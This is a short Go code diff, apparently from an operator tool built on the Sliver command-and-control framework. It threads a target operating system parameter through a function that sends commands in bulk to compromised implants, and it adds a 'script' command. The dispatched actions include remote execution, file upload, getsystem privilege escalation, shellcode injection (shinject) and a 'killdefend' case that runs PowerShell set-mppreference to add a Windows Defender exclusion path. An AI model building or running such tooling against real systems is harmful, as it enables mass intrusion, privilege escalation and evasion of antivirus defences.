@@ -8,7 +8,7 @@ import (
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
 )
 
-func RunMass(rpc rpcpb.SliverRPCClient, args ...string) {
+func RunMass(rpc rpcpb.SliverRPCClient, target_os string, args ...string) {
 
 	utils.Dprint("Command: %s", args[0])
 	for idx, arg := range args[0:] {
@@ -20,9 +20,9 @@ func RunMass(rpc rpcpb.SliverRPCClient, args ...string) {
 	}
 	switch strings.ToLower(args[0]) {
 	case "execute":
-		dispatch.Execute(rpc, args[1:]...)
+		dispatch.Execute(rpc, target_os, args[1:]...)
 	case "upload":
-		dispatch.Upload(rpc, args[1:]...)
+		dispatch.Upload(rpc, target_os, args[1:]...)
 	case "nosferatu":
 		dispatch.Nosferatu(rpc, args[1:]...)
 	case "getsystem":
@@ -30,7 +30,9 @@ func RunMass(rpc rpcpb.SliverRPCClient, args ...string) {
 	case "shinject":
 		dispatch.Shinject(rpc, args[1:]...)
 	case "killdefend":
-		dispatch.Execute(rpc, []string{"cmd.exe", "/c", "powershell", "-c", "set-mppreference", "-exclusionpath", args[1]}...)
+		dispatch.Execute(rpc, target_os, []string{"cmd.exe", "/c", "powershell", "-c", "set-mppreference", "-exclusionpath", args[1]}...)
+	case "script":
+		dispatch.Script(rpc, target_os, args[1:]...)
 	}
 
 }
